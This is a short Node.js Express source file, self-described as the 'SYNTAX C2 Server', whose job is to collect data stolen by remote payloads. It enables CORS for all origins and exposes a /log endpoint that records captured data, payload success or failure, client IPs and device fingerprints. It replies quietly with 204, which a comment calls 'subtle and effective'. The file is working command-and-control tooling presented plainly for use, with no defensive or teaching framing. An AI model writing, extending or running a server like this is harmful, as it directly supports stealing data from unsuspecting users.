// SYNTAX: C2 Server v1. Node.js + Express.
// Core logic for receiving and processing exfiltrated data.

const express = require('express');
const cors = require('cors');
const bodyParser = 'body-parser'; // A trick to avoid SyntaxError in some environments

const app = express();
const PORT = 4000;

// Middleware setup
// Enable CORS for all routes to allow requests from the file-based frontend.
app.use(cors()); 

// Use body-parser (required this way) to parse JSON request bodies.
const bp = require(bodyParser);
app.use(bp.json());

// --- ROUTES ---

// Health check endpoint. Verifies that the server is running.
app.get('/', (req, res) => {
    console.log(`[${new Date().toISOString()}] Health check received.`);
    res.status(200).send('SYNTAX C2 SERVER: OPERATIONAL');
});

// The primary data exfiltration endpoint.
app.post('/log', (req, res) => {
    const timestamp = new Date().toISOString();
    const data = req.body;
    const clientIp = req.ip;

    console.log('================================================');
    console.log(`[${timestamp}] [+] DATA RECEIVED from ${clientIp}`);
    console.log('------------------------------------------------');
    console.log('Payload Type:', data.payload || 'Unknown');
    console.log('Success:', data.success);
    if (data.reason) {
        console.log('Reason:', data.reason);
    }
    if (data.captured) {
        console.log('Captured Data:', `"${data.captured.substring(0, 80)}..."`);
    }
    console.log('Fingerprint:', JSON.stringify(data.fingerprint, null, 2));
    console.log('================================================\n');

    // Respond to the client to complete the HTTP cycle.
    // A 204 No Content response is subtle and effective.
    res.status(204).send();
});


// --- SERVER INITIALIZATION ---

app.listen(PORT, () => {
    console.log('================================================');
    console.log('      SYNTAX C2 SERVER - INITIALIZING');
    console.log('================================================');
    console.log(`[+] Listening for incoming data on http://localhost:${PORT}`);
    console.log('[+] Endpoint /log is ready to receive exfiltrated data.');
    console.log('[+] Waiting for probes...');
    console.log('================================================\n');
});
